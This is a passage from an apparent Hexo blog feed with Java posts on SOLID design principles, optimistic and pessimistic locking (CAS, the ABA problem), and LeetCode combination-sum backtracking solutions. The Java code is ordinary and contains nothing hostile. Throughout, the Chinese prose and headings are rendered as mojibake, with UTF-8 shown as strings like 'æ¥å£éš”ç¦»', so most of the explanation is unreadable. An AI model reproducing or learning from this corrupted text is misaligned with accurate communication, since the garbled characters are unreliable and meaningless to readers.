class="headerlink" title="æ¥å£éš”ç¦»åŸåˆ™(Interface Segregation Principle)"></a>æ¥å£éš”ç¦»åŸåˆ™(Interface Segregation Principle)</h4><p><strong>å®¢æˆ·ç«¯ä¸åº”è¯¥ä¾èµ–å®ƒä¸éœ€è¦çš„æ¥å£</strong></p><p>æ„æ€å°±æ˜¯å®¢æˆ·ç«¯éœ€è¦ä»€ä¹ˆæ¥å£å°±æä¾›ä»€ä¹ˆæ¥å£ï¼ŒæŠŠä¸éœ€è¦çš„æ¥å£å‰”é™¤æ‰ï¼Œè¿™å°±éœ€è¦å¯¹æ¥å£è¿›è¡Œç»†åŒ–ï¼Œä¿è¯æ¥å£çš„çº¯æ´æ€§ã€‚æ¢æˆå¦ä¸€ç§è¯´æ³•å°±æ˜¯ï¼Œç±»é—´çš„ä¾èµ–å…³ç³»åº”è¯¥å»ºç«‹åœ¨æœ€å°çš„æ¥å£ä¸Šï¼Œä¹Ÿå°±æ˜¯å»ºç«‹å•ä¸€çš„æ¥å£ã€‚</p><p>ä½ å¯èƒ½ä¼šç–‘æƒ‘ï¼Œå»ºç«‹å•ä¸€æ¥å£ï¼Œè¿™ä¸æ˜¯å•ä¸€èŒè´£åŸåˆ™å—ï¼Ÿå…¶å®ä¸æ˜¯ï¼Œå•ä¸€èŒè´£åŸåˆ™è¦æ±‚çš„æ˜¯ç±»å’Œæ¥å£èŒè´£å•ä¸€ï¼Œæ³¨é‡çš„æ˜¯èŒè´£ï¼Œä¸€ä¸ªèŒè´£çš„æ¥å£æ˜¯å¯ä»¥æœ‰å¤šä¸ªæ–¹æ³•çš„ï¼Œè€Œæ¥å£éš”ç¦»åŸåˆ™è¦æ±‚çš„æ˜¯æ¥å£çš„æ–¹æ³•å°½é‡å°‘ï¼Œæ¨¡å—å°½é‡å•ä¸€ï¼Œå¦‚æœéœ€è¦æä¾›ç»™å®¢æˆ·ç«¯å¾ˆå¤šçš„æ¨¡å—ï¼Œé‚£ä¹ˆå°±è¦ç›¸åº”çš„å®šä¹‰å¤šä¸ªæ¥å£ï¼Œä¸è¦æŠŠæ‰€æœ‰çš„æ¨¡å—åŠŸèƒ½éƒ½å®šä¹‰åœ¨ä¸€ä¸ªæ¥å£ä¸­ï¼Œé‚£æ ·ä¼šæ˜¾å¾—å¾ˆè‡ƒè‚¿ã€‚</p><h4 id="ä¾èµ–å€’ç½®åŸåˆ™-Dependency-Inversion-Principle"><a href="#ä¾èµ–å€’ç½®åŸåˆ™-Dependency-Inversion-Principle" class="headerlink" title="ä¾èµ–å€’ç½®åŸåˆ™(Dependency Inversion Principle)"></a>ä¾èµ–å€’ç½®åŸåˆ™(Dependency Inversion Principle)</h4><p><strong>é«˜å±‚æ¨¡å—ä¸åº”è¯¥ä¾èµ–åº•å±‚æ¨¡å—,ä¸¤è€…éƒ½åº”è¯¥ä¾èµ–å…¶æŠ½è±¡;</strong><br><strong>æŠ½è±¡ä¸åº”è¯¥ä¾èµ–ç»†èŠ‚;</strong><br><strong>ç»†èŠ‚åº”è¯¥ä¾èµ–æŠ½è±¡.</strong></p><p>æŠ½è±¡å°±æ˜¯æŒ‡æ¥å£æˆ–æŠ½è±¡ç±»ï¼Œä¸¤è€…éƒ½ä¸èƒ½è¢«å®ä¾‹åŒ–ï¼›è€Œç»†èŠ‚å°±æ˜¯å®ç°æ¥å£æˆ–ç»§æ‰¿æŠ½è±¡ç±»äº§ç”Ÿçš„ç±»ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥è¢«å®ä¾‹åŒ–çš„å®ç°ç±»ã€‚ä¾èµ–å€’ç½®åŸåˆ™æ˜¯æŒ‡æ¨¡å—é—´çš„ä¾èµ–æ˜¯é€šè¿‡æŠ½è±¡æ¥å‘ç”Ÿçš„ï¼Œå®ç°ç±»ä¹‹é—´ä¸å‘ç”Ÿç›´æ¥çš„ä¾èµ–å…³ç³»ï¼Œå…¶ä¾èµ–å…³ç³»æ˜¯é€šè¿‡æ¥å£æ˜¯æ¥å®ç°çš„ï¼Œè¿™å°±æ˜¯ä¿—ç§°çš„é¢å‘æ¥å£ç¼–ç¨‹ã€‚</p><p>ä¸çŸ¥é“æœ‰æ²¡æœ‰ç»†å¿ƒçš„åŒå­¦å‘ç°,è¿™å…­å¤§åŸåˆ™çš„é¦–å­—æ¯å¯ä»¥ç»„æˆä¸€ä¸ªå•è¯:SOLID,å¯èƒ½è¿™å°±æ˜¯è¿™å…­å¤§è®¾è®¡åŸåˆ™æƒ³è¾¾åˆ°çš„ç›®æ ‡å§.</p><h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><ul><li>ã€Šè®¾è®¡æ¨¡å¼ä¹‹ç¦…ã€‹ç¬¬äºŒç‰ˆ</li><li>ã€Šé‡å­¦Javaè®¾è®¡æ¨¡å¼ã€‹by xfg</li><li><a href="https://blog.csdn.net/txaz6/article/details/120138199" style="color: #177cb0; text-decoration: underline;text-decoration-style: dotted;">é¢å‘å¯¹è±¡è®¾è®¡çš„å…­å¤§è®¾è®¡åŸåˆ™</a><br>â€¦â€¦</li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è®¾è®¡æ¨¡å¼ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¹è§‚é”å’Œæ‚²è§‚é”</title>
      <link href="/2023/10/30/%E4%B9%90%E8%A7%82%E9%94%81%E5%92%8C%E6%82%B2%E8%A7%82%E9%94%81/"/>
      <url>/2023/10/30/%E4%B9%90%E8%A7%82%E9%94%81%E5%92%8C%E6%82%B2%E8%A7%82%E9%94%81/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¹è§‚é”å’Œæ‚²è§‚é”"><a href="#ä¹è§‚é”å’Œæ‚²è§‚é”" class="headerlink" title="ä¹è§‚é”å’Œæ‚²è§‚é”"></a>ä¹è§‚é”å’Œæ‚²è§‚é”</h2><h3 id="ä¹è§‚é”"><a href="#ä¹è§‚é”" class="headerlink" title="ä¹è§‚é”"></a>ä¹è§‚é”</h3><p>ä¹è§‚è®¤ä¸ºä¸ä¼šæœ‰åˆ«çš„çº¿ç¨‹ä¸å®ƒæ¥æŠ¢å ä¿®æ”¹,ç›´æ¥å¯¹æ•°æ®è¿›è¡Œä¿®æ”¹,åœ¨æäº¤çš„æ—¶å€™è¿›è¡Œæ£€æŸ¥,çœ‹æ˜¯å¦æœ‰åˆ«çš„çº¿ç¨‹ä¿®æ”¹è¿‡æ•°æ®,å¦‚æœä¿®æ”¹è¿‡,å°±æ”¾å¼ƒä¿®æ”¹,è¿”å›é”™è¯¯æˆ–è€…é‡è¯•.</p><p>ä¹è§‚é”ä¸€èˆ¬æœ‰ä¸¤ç§å®ç°æ–¹å¼:<strong>ç‰ˆæœ¬å·æœºåˆ¶å’ŒCASç®—æ³•</strong></p><h4 id="ç‰ˆæœ¬å·æœºåˆ¶-redisé‡‡ç”¨çš„æ–¹æ¡ˆ"><a href="#ç‰ˆæœ¬å·æœºåˆ¶-redisé‡‡ç”¨çš„æ–¹æ¡ˆ" class="headerlink" title="ç‰ˆæœ¬å·æœºåˆ¶(redisé‡‡ç”¨çš„æ–¹æ¡ˆ)"></a>ç‰ˆæœ¬å·æœºåˆ¶(redisé‡‡ç”¨çš„æ–¹æ¡ˆ)</h4><p>ä¸€èˆ¬æ˜¯åœ¨æ•°æ®è¡¨ä¸­åŠ ä¸Šä¸€ä¸ªæ•°æ®ç‰ˆæœ¬å· version å­—æ®µï¼Œè¡¨ç¤ºæ•°æ®è¢«ä¿®æ”¹çš„æ¬¡æ•°ã€‚å½“æ•°æ®è¢«ä¿®æ”¹æ—¶ï¼Œversion å€¼ä¼šåŠ ä¸€ã€‚å½“çº¿ç¨‹ A è¦æ›´æ–°æ•°æ®å€¼æ—¶ï¼Œåœ¨è¯»å–æ•°æ®çš„åŒæ—¶ä¹Ÿä¼šè¯»å– version å€¼ï¼Œåœ¨æäº¤æ›´æ–°æ—¶ï¼Œè‹¥åˆšæ‰è¯»å–åˆ°çš„ version å€¼ä¸ºå½“å‰æ•°æ®åº“ä¸­çš„ version å€¼ç›¸ç­‰æ—¶æ‰æ›´æ–°ï¼Œå¦åˆ™é‡è¯•æ›´æ–°æ“ä½œï¼Œç›´åˆ°æ›´æ–°æˆåŠŸã€‚</p><h4 id="CASç®—æ³•"><a href="#CASç®—æ³•" class="headerlink" title="CASç®—æ³•"></a>CASç®—æ³•</h4><p>CAS çš„å…¨ç§°æ˜¯ <strong>Compare And Swapï¼ˆæ¯”è¾ƒä¸äº¤æ¢ï¼‰</strong> ï¼Œç”¨äºå®ç°ä¹è§‚é”ï¼Œè¢«å¹¿æ³›åº”ç”¨äºå„å¤§æ¡†æ¶ä¸­ã€‚CAS çš„æ€æƒ³å¾ˆç®€å•ï¼Œå°±æ˜¯ç”¨ä¸€ä¸ªé¢„æœŸå€¼å’Œè¦æ›´æ–°çš„å˜é‡å€¼è¿›è¡Œæ¯”è¾ƒï¼Œä¸¤å€¼ç›¸ç­‰æ‰ä¼šè¿›è¡Œæ›´æ–°ã€‚</p><p>CASç®—æ³•ä¼šæœ‰ä¸€ä¸ª<strong>å·¨å¤§çš„é—®é¢˜</strong>,å°±æ˜¯<strong><em>ABAé—®é¢˜</em></strong>.å¦‚æœä¸€ä¸ªå˜é‡ V åˆæ¬¡è¯»å–çš„æ—¶å€™æ˜¯ A å€¼ï¼Œå¹¶ä¸”åœ¨å‡†å¤‡èµ‹å€¼çš„æ—¶å€™æ£€æŸ¥åˆ°å®ƒä»ç„¶æ˜¯ A å€¼ï¼Œé‚£æˆ‘ä»¬å°±èƒ½è¯´æ˜å®ƒçš„å€¼æ²¡æœ‰è¢«å…¶ä»–çº¿ç¨‹ä¿®æ”¹è¿‡äº†å—ï¼Ÿå¾ˆæ˜æ˜¾æ˜¯ä¸èƒ½çš„ï¼Œå› ä¸ºåœ¨è¿™æ®µæ—¶é—´å®ƒçš„å€¼å¯èƒ½è¢«æ”¹ä¸ºå…¶ä»–å€¼ï¼Œç„¶ååˆæ”¹å› Aï¼Œé‚£ CAS æ“ä½œå°±ä¼šè¯¯è®¤ä¸ºå®ƒä»æ¥æ²¡æœ‰è¢«ä¿®æ”¹è¿‡ã€‚ABA é—®é¢˜çš„è§£å†³æ€è·¯æ˜¯åœ¨å˜é‡å‰é¢è¿½åŠ ä¸Š<strong>ç‰ˆæœ¬å·æˆ–è€…æ—¶é—´æˆ³(javaé‡‡ç”¨çš„æ–¹æ¡ˆ)</strong>ã€‚</p><p>CASç®—æ³•è¿˜æœ‰ä¸€ä¸ª<strong>é—®é¢˜</strong>å°±æ˜¯<strong>å¾ªç¯æ—¶é—´é•¿å¼€é”€å¤§</strong>.CAS ç»å¸¸ä¼šç”¨åˆ°è‡ªæ—‹æ“ä½œæ¥è¿›è¡Œé‡è¯•ï¼Œä¹Ÿå°±æ˜¯ä¸æˆåŠŸå°±ä¸€ç›´å¾ªç¯æ‰§è¡Œç›´åˆ°æˆåŠŸã€‚å¦‚æœé•¿æ—¶é—´ä¸æˆåŠŸï¼Œä¼šç»™ CPU å¸¦æ¥éå¸¸å¤§çš„æ‰§è¡Œå¼€é”€ã€‚</p><h4 id="ä¹è§‚é”çš„ç‰¹ç‚¹ï¼š"><a href="#ä¹è§‚é”çš„ç‰¹ç‚¹ï¼š" class="headerlink" title="ä¹è§‚é”çš„ç‰¹ç‚¹ï¼š"></a>ä¹è§‚é”çš„ç‰¹ç‚¹ï¼š</h4><p>1.ä¹è§‚é”é€‚ç”¨äºå¹¶å‘è¯»æ“ä½œè¾ƒå¤šçš„åœºæ™¯ï¼Œå› ä¸ºè¯»æ“ä½œä¸æ¶‰åŠåˆ°æ•°æ®çš„ä¿®æ”¹ï¼Œä¸éœ€è¦åŠ é”ã€‚<br>2.ä¹è§‚é”åœ¨æ›´æ–°æ•°æ®æ—¶ï¼Œåªæœ‰åœ¨æäº¤æ›´æ–°æ“ä½œæ—¶æ‰å¯¹æ•°æ®è¿›è¡Œç‰ˆæœ¬æ£€æŸ¥ï¼Œå‡å°‘äº†åŠ é”å’Œè§£é”çš„å¼€é”€ã€‚<br>3.ä¹è§‚é”å¯èƒ½éœ€è¦è¿›è¡Œé‡è¯•ï¼Œä»¥å¤„ç†å¹¶å‘ä¿®æ”¹å¼•èµ·çš„å†²çªã€‚</p><h3 id="æ‚²è§‚é”"><a href="#æ‚²è§‚é”" class="headerlink" title="æ‚²è§‚é”"></a>æ‚²è§‚é”</h3><p>æ‚²è§‚é”æ€»è®¤ä¸ºä¼šåˆ«çš„çº¿ç¨‹å›æ¥æŠ¢å ä¿®æ”¹,äºæ˜¯é‡‡ç”¨ä¸€ç§<strong>é˜²å¾¡çš„å§¿æ€</strong>å°†æ•°æ®é”ä½,æ‰€ä»¥æ¯æ¬¡åœ¨è·å–èµ„æºæ“ä½œçš„æ—¶å€™éƒ½ä¼šä¸Šé”ï¼Œè¿™æ ·å…¶ä»–çº¿ç¨‹æƒ³æ‹¿åˆ°è¿™ä¸ªèµ„æºå°±ä¼šé˜»å¡ç›´åˆ°é”è¢«ä¸Šä¸€ä¸ªæŒæœ‰è€…é‡Šæ”¾ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå…±äº«èµ„æºæ¯æ¬¡åªç»™ä¸€ä¸ªçº¿ç¨‹ä½¿ç”¨ï¼Œå…¶å®ƒçº¿ç¨‹é˜»å¡ï¼Œç”¨å®Œåå†æŠŠèµ„æºè½¬è®©ç»™å…¶å®ƒçº¿ç¨‹ã€‚</p><h4 id="æ‚²è§‚é”çš„ç‰¹ç‚¹ï¼š"><a href="#æ‚²è§‚é”çš„ç‰¹ç‚¹ï¼š" class="headerlink" title="æ‚²è§‚é”çš„ç‰¹ç‚¹ï¼š"></a>æ‚²è§‚é”çš„ç‰¹ç‚¹ï¼š</h4><p>1.æ‚²è§‚é”é€‚ç”¨äºå¹¶å‘å†™æ“ä½œè¾ƒå¤šçš„åœºæ™¯ï¼Œå› ä¸ºå†™æ“ä½œæ¶‰åŠåˆ°æ•°æ®çš„ä¿®æ”¹ï¼Œéœ€è¦ä¿è¯æ•°æ®çš„ä¸€è‡´æ€§ã€‚<br>2.æ‚²è§‚é”åœ¨åŠ é”æœŸé—´ï¼Œå…¶ä»–çº¿ç¨‹æ— æ³•è®¿é—®è¢«é”å®šçš„èµ„æºï¼Œä»è€Œä¿è¯äº†æ•°æ®çš„å®Œæ•´æ€§ã€‚<br>3.æ‚²è§‚é”éœ€è¦é¢‘ç¹åœ°è¿›è¡ŒåŠ é”å’Œè§£é”æ“ä½œï¼Œå¼€é”€è¾ƒå¤§ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ç»å…¸ç»„åˆé—®é¢˜</title>
      <link href="/2023/10/18/%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88%E9%97%AE%E9%A2%98/"/>
      <url>/2023/10/18/%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="ç»å…¸ç»„åˆé—®é¢˜"><a href="#ç»å…¸ç»„åˆé—®é¢˜" class="headerlink" title="ç»å…¸ç»„åˆé—®é¢˜"></a>ç»å…¸ç»„åˆé—®é¢˜</h1><hr><p>åœ¨<strong>Leetcode</strong>åˆ·è¿‡<strong>å›æº¯ç®—æ³•</strong>çš„åŒå­¦åº”è¯¥éƒ½çŸ¥é“,ç»„åˆé—®é¢˜æ˜¯å›æº¯ç®—æ³•ä¸­ç»å…¸çš„ä¸€ç§é¢˜å‹</p><p>æœ¬ç¯‡åšå®¢ç»™å¤§å®¶ä»‹ç»çš„å°±æ˜¯ç»„åˆé—®é¢˜ä¸‰å…„å¼Ÿ:<br><strong><em>39.æ•°ç»„æ€»å’Œ</em></strong><br><strong><em>40.æ•°ç»„æ€»å’ŒII</em></strong><br><strong><em>216.æ•°ç»„æ€»å’ŒIII</em></strong></p><p>ä¸ºä»€ä¹ˆæˆ‘æƒ³è¯´è¯´è¿™ä¸‰é“é¢˜å‘¢,å› ä¸ºè¿™ä¸‰é“é¢˜çš„æœ¬è´¨å°±æ˜¯å¥—å›æº¯ç®—æ³•çš„æ¨¡ç‰ˆ</p><p>å±äºåªè¦å¼„æ˜ç™½äº†,é‚£ä¹ˆç»„åˆé—®é¢˜å°±ä¸€å®šæ²¡é—®é¢˜äº†,ç”šè‡³å¤§éƒ¨åˆ†çš„å›æº¯ç®—æ³•é—®é¢˜ä¹Ÿèƒ½å¤Ÿè§£å†³</p><p>å›æº¯æ³•ï¼ˆback trackingï¼‰ï¼ˆæ¢ç´¢ä¸å›æº¯æ³•ï¼‰æ˜¯ä¸€ç§é€‰ä¼˜æœç´¢æ³•ï¼Œåˆç§°ä¸ºè¯•æ¢æ³•ï¼ŒæŒ‰é€‰ä¼˜æ¡ä»¶å‘å‰æœç´¢ï¼Œä»¥è¾¾åˆ°ç›®æ ‡ã€‚<strong>ä½†å½“æ¢ç´¢åˆ°æŸä¸€æ­¥æ—¶ï¼Œå‘ç°åŸå…ˆé€‰æ‹©å¹¶ä¸ä¼˜æˆ–è¾¾ä¸åˆ°ç›®æ ‡ï¼Œå°±é€€å›åˆ°ä¸Šä¸€æ­¥ï¼Œé‡æ–°é€‰æ‹©</strong>,è¿™ç§èµ°ä¸é€šå°±é€€å›å†èµ°çš„æŠ€æœ¯ä¸ºå›æº¯æ³•ï¼Œè€Œæ»¡è¶³å›æº¯æ¡ä»¶çš„æŸä¸ªçŠ¶æ€çš„ç‚¹ç§°ä¸ºâ€œå›æº¯ç‚¹â€ã€‚</p><p>å›æº¯ç®—æ³•çš„å…³é”®åœ¨äºæ‰¾åˆ°ç»ˆæ­¢æ¡ä»¶,æ— è®ºæ˜¯å­è¿‡ç¨‹ç»“æŸçš„ç»ˆæ­¢æ¡ä»¶,è¿˜æ˜¯å›é€€åˆ°ä¸Šä¸€æ­¥çš„ç»ˆæ­¢æ¡ä»¶.</p><p>ä¾‹å¦‚ <strong>39æ•°ç»„æ€»å’Œ</strong> è¿™é“é¢˜ä¸­å­è¿‡ç¨‹çš„ç»ˆæ­¢æ¡ä»¶ä¸º<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(target==<span class="number">0</span>)&#123;</span><br><span class="line">    ans.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(list));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>å›é€€åˆ°ä¸Šä¸€æ­¥çš„ç»ˆæ­¢æ¡ä»¶ä¸º<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(target-candidates[i]&lt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>è¿™å°±æ˜¯è§£å†³é—®é¢˜çš„å…³é”®</p><p><strong>å›æº¯ç®—æ³•æ¨¡ç‰ˆ(ä¼ªä»£ç ç‰ˆ)</strong><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">backtracking</span><span class="params">(å‚æ•°)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (ç»ˆæ­¢æ¡ä»¶) &#123;</span><br><span class="line">        å­˜æ”¾ç»“æœ;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (é€‰æ‹©ï¼šæœ¬å±‚é›†åˆä¸­å…ƒç´ ï¼ˆæ ‘ä¸­èŠ‚ç‚¹å­©å­çš„æ•°é‡å°±æ˜¯é›†åˆçš„å¤§å°ï¼‰) &#123;</span><br><span class="line">        å¤„ç†èŠ‚ç‚¹;</span><br><span class="line">        backtracking(è·¯å¾„ï¼Œé€‰æ‹©åˆ—è¡¨); <span class="comment">// é€’å½’</span></span><br><span class="line">        å›æº¯ï¼Œæ’¤é”€å¤„ç†ç»“æœ</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><strong>å›æº¯ç®—æ³•æ¨¡ç‰ˆ(è¯¦ç»†ç‰ˆ)å°±æ˜¯39æ•°ç»„æ€»å’Œçš„ä»£ç </strong></p><h2 id="39æ•°ç»„æ€»å’Œ"><a href="#39æ•°ç»„æ€»å’Œ" class="headerlink" title="39æ•°ç»„æ€»å’Œ"></a>39æ•°ç»„æ€»å’Œ</h2><h4 id="1-æ ‡å‡†å›æº¯"><a href="#1-æ ‡å‡†å›æº¯" class="headerlink" title="1.æ ‡å‡†å›æº¯"></a>1.æ ‡å‡†å›æº¯</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; ans=<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line">    List&lt;Integer&gt; list=<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">combinationSum</span><span class="params">(<span class="type">int</span>[] candidates, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        Arrays.sort(candidates);</span><br><span class="line">        backtrack(candidates,target,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> ans;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">backtrack</span><span class="params">(<span class="type">int</span>[] candidates,<span class="type">int</span> target,<span class="type">int</span> start)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(target==<span class="number">0</span>)&#123;</span><br><span class="line">            ans.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(list));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=start;i&lt;candidates.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(target-candidates[i]&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            list.add(candidates[i]);</span><br><span class="line">            backtrack(candidates,target-candidates[i],i);</span><br><span class="line">            list.remove(list.size()-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="40æ•°ç»„æ€»å’ŒII"><a href="#40æ•°ç»„æ€»å’ŒII" class="headerlink" title="40æ•°ç»„æ€»å’ŒII"></a>40æ•°ç»„æ€»å’ŒII</h2><p>è·Ÿ39é¢˜éå¸¸åƒ,å°±æ˜¯è¦é˜²æ­¢é‡å¤å‡ºç°çš„å­é›†<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; ans=<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line">    List&lt;Integer&gt; list=<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">combinationSum2</span><span class="params">(<span class="type">int</span>[] candidates, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        Arrays.sort(candidates);</span><br><span class="line">        combine(candidates,target,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">combine</span><span class="params">(<span class="type">int</span>[] candidates,<span class="type">int</span> target,<span class="type">int</span> start)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(target==<span class="number">0</span>)&#123;</span><br><span class="line">            ans.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(list));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=start;i&lt;candidates.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(target-candidates[i]&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(i&gt;start&amp;&amp;candidates[i]==candidates[i-<span class="number">1</span>])&#123;<span class="comment">//æœ€å…³é”®çš„å°±æ˜¯è¿™ä¸ª</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            list.add(candidates[i]);</span><br><span class="line">            combine(candidates,target-candidates[i],i+<span class="number">1</span>);</span><br><span class="line">            list.remove(list.size()-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="216æ•°ç»„æ€»å’ŒIII"><a href="#216æ•°ç»„æ€»å’ŒIII" class="headerlink" title="216æ•°ç»„æ€»å’ŒIII"></a>216æ•°ç»„æ€»å’ŒIII</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; ans=<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line">    List&lt;Integer&gt; list=<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">combinationSum3</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(n&lt;=k)&#123;</span><br><span class="line">            <span class="keyword">return</span> ans;</span><br><span class="line">        &#125;</span><br><span class="line">        combine(k,n,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">combine</span><span class="params">(<span class="type">int</span> k,<span class="type">int</span> n,<span class="type">int</span> start)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(k==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(n==<span class="number">0</span>)&#123;</span><br><span class="line">                ans.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(list));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=start;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(n-i&lt;<span class="number">0</span>||k&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            list.add(i);</span><br><span class="line">            combine(k-<span class="number">1</span>,n-i,i+<span class="number">1</span>);</span><br><span class="line">            list.remove(list.size()-<span class="number">1</span>);</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span 